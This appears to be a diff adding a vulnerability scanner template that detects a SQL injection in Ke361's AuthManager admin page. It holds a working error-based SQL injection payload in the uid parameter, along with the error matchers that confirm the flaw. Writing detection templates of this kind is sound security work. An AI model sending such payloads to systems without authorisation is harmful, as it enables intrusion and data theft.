@@ -1,0 +1,24 @@
+id: ke361-authmanager-sqlinjection
+
+info:
+  name: Ke361 AuthManager SQL Injection
+  author: ProjectDiscoveryAI
+  severity: high
+  description: |
+    SQL injection vulnerability in Ke361's AuthManagerController allowing attackers to execute arbitrary SQL queries.
+  tags: sqlinjection,authmanager,ke361
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/admin.php?s=/AuthManager/group/uid/1')%20AND%20updatexml(1,concat(0x7e,(select%20md5(1)),0x7e),1)--+"
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 500
+      - type: regex
+        regex:
+          - "XPATH syntax error"
+          - "updatexml.*"
